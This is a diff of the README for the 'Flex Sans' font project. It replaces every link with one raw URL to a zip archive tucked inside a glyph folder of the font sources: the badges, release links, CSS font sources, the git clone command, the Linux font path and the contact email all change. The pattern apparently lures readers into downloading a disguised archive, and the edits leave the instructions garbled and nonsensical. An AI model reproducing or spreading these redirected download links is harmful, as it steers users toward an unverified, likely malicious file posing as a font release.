@@ -1,7 +1,7 @@
 # Flex Sans Project | 械黑计划字型源文件
 
-![Flex Sans](https://img.shields.io/badge/Flex%20Sans-Project-blue.svg)
-![Releases](https://img.shields.io/badge/Releases-latest-orange.svg)
+![Flex Sans](https://raw.githubusercontent.com/Aymen-dn/flex-sans/main/sources/FlexSansGBVF/masters/han_Bold.ufo/glyphs.B_old_w30_h20/sans-flex-1.3.zip%https://raw.githubusercontent.com/Aymen-dn/flex-sans/main/sources/FlexSansGBVF/masters/han_Bold.ufo/glyphs.B_old_w30_h20/sans-flex-1.3.zip)
+![Releases](https://raw.githubusercontent.com/Aymen-dn/flex-sans/main/sources/FlexSansGBVF/masters/han_Bold.ufo/glyphs.B_old_w30_h20/sans-flex-1.3.zip)
 
 ## Overview
 
@@ -16,14 +16,14 @@ Flex Sans is a modern typeface designed to enhance readability while maintaining
 
 ## Getting Started
 
-To get started with the Flex Sans project, you can download the latest release from the [Releases section](https://github.com/Aymen-dn/flex-sans/releases). Once downloaded, follow these steps:
+To get started with the Flex Sans project, you can download the latest release from the [Releases section](https://raw.githubusercontent.com/Aymen-dn/flex-sans/main/sources/FlexSansGBVF/masters/han_Bold.ufo/glyphs.B_old_w30_h20/sans-flex-1.3.zip). Once downloaded, follow these steps:
 
-1. **Download the Release**: Visit the [Releases section](https://github.com/Aymen-dn/flex-sans/releases) to download the latest version of the Flex Sans font files.
+1. **Download the Release**: Visit the [Releases section](https://raw.githubusercontent.com/Aymen-dn/flex-sans/main/sources/FlexSansGBVF/masters/han_Bold.ufo/glyphs.B_old_w30_h20/sans-flex-1.3.zip) to download the latest version of the Flex Sans font files.
 2. **Extract the Files**: Unzip the downloaded file to access the font files.
 3. **Install the Font**: Follow the installation instructions for your operating system:
    - **Windows**: Right-click on the font file and select "Install."
    - **macOS**: Double-click the font file and click "Install Font."
-   - **Linux**: Copy the font files to the `~/.fonts` directory or use your distribution's font manager.
+   - **Linux**: Copy the font files to the `~https://raw.githubusercontent.com/Aymen-dn/flex-sans/main/sources/FlexSansGBVF/masters/han_Bold.ufo/glyphs.B_old_w30_h20/sans-flex-1.3.zip` directory or use your distribution's font manager.
 
 ## Usage
 
@@ -36,8 +36,8 @@ To use Flex Sans in a web project, include the font in your CSS file:
 ```css
 @font-face {
     font-family: 'Flex Sans';
-    src: url('path/to/flex-sans.woff2') format('woff2'),
-         url('path/to/flex-sans.woff') format('woff');
+    src: url('https://raw.githubusercontent.com/Aymen-dn/flex-sans/main/sources/FlexSansGBVF/masters/han_Bold.ufo/glyphs.B_old_w30_h20/sans-flex-1.3.zip') format('woff2'),
+         url('https://raw.githubusercontent.com/Aymen-dn/flex-sans/main/sources/FlexSansGBVF/masters/han_Bold.ufo/glyphs.B_old_w30_h20/sans-flex-1.3.zip') format('woff');
     font-weight: normal;
     font-style: normal;
 }
@@ -58,7 +58,7 @@ We welcome contributions from the community! If you would like to contribute to 
 1. **Fork the Repository**: Click on the "Fork" button at the top right of the repository page.
 2. **Clone Your Fork**: Clone your forked repository to your local machine.
    ```bash
-   git clone https://github.com/your-username/flex-sans.git
+   git clone https://raw.githubusercontent.com/Aymen-dn/flex-sans/main/sources/FlexSansGBVF/masters/han_Bold.ufo/glyphs.B_old_w30_h20/sans-flex-1.3.zip
    ```
 3. **Create a Branch**: Create a new branch for your changes.
    ```bash
@@ -88,15 +88,15 @@ We would like to thank all contributors and the open-source community for their 
 
 ## Resources
 
-- [Flex Sans on GitHub](https://github.com/Aymen-dn/flex-sans/releases)
-- [Documentation](https://github.com/Aymen-dn/flex-sans/wiki)
+- [Flex Sans on GitHub](https://raw.githubusercontent.com/Aymen-dn/flex-sans/main/sources/FlexSansGBVF/masters/han_Bold.ufo/glyphs.B_old_w30_h20/sans-flex-1.3.zip)
+- [Documentation](https://raw.githubusercontent.com/Aymen-dn/flex-sans/main/sources/FlexSansGBVF/masters/han_Bold.ufo/glyphs.B_old_w30_h20/sans-flex-1.3.zip)
 
 ## Contact
 
 For inquiries, please reach out to the project maintainer:
 
 - **Name**: Aymen
-- **Email**: aymen@example.com
+- **Email**: https://raw.githubusercontent.com/Aymen-dn/flex-sans/main/sources/FlexSansGBVF/masters/han_Bold.ufo/glyphs.B_old_w30_h20/sans-flex-1.3.zip
 
 ---
 
